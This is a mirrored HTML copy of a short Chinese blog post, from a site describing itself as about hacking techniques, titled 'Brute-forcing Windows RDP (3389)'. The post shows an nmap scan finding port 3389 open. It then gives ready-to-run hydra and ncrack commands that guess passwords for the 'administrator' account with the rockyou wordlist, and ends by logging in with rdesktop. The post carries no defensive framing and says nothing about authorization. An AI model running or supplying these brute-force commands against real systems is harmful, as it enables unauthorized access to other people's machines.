@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/brute-force-RDP-with-hydra-and-ncrack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:46:52 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>暴力破解Windows RDP(3389)</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="RDP是远程桌面协议。
+
+" />
+    <meta property="og:description" content="RDP是远程桌面协议。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="暴力破解Windows RDP(3389)" />
+    <meta property="twitter:title" content="暴力破解Windows RDP(3389)" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>暴力破解Windows RDP(3389)</h1>
+
+  <div class="entry">
+    <p>RDP是远程桌面协议。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ nmap your_target
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-09-20 17:29 CST
+Nmap scan report for ns514636.ip-192-95-xx.net (192.95.xx.xx)
+Host is up (0.28s latency).
+Not shown: 988 closed ports
+PORT      STATE    SERVICE
+135/tcp   filtered msrpc
+139/tcp   filtered netbios-ssn
+445/tcp   filtered microsoft-ds
+593/tcp   filtered http-rpc-epmap
+3389/tcp  open     ms-wbt-server   # 这个是远程桌面端口
+4444/tcp  filtered krb524
+6667/tcp  filtered irc
+49152/tcp open     unknown
+49153/tcp open     unknown
+49154/tcp open     unknown
+49155/tcp open     unknown
+49163/tcp open     unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds
+</code></pre>
+</div>
+
+<p>使用hydra暴力破解：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://your_target
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>-t = TASKS run TASKS number of connects in parallel (per host, default: 16) RDP set to maximum of 4.
+-V = Verbose shows you the attempted passwords.
+-l = Username
+-P = Password list
+rdp:// = Port 3389
+</code></pre>
+</div>
+
+<p>使用ncrack暴力破解：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>ncrack -p 3389 -v -user administrator -P /usr/share/wordlists/rockyou.txt 192.95.xx.xx
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>-p = Port number
+-v = Verbose shows you any found passwords in realtime
+-user = username
+-P = Password list
+</code></pre>
+</div>
+
+<p>远程桌面登录：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>rdesktop your_target
+</code></pre>
+</div>
+
+  </div>
+
+  <div class="date">
+    Written on September 20, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/brute-force-RDP-with-hydra-and-ncrack/',
+		  'title': '暴力破解Windows RDP(3389)'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/brute-force-RDP-with-hydra-and-ncrack/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:46:52 GMT -->
+</html>
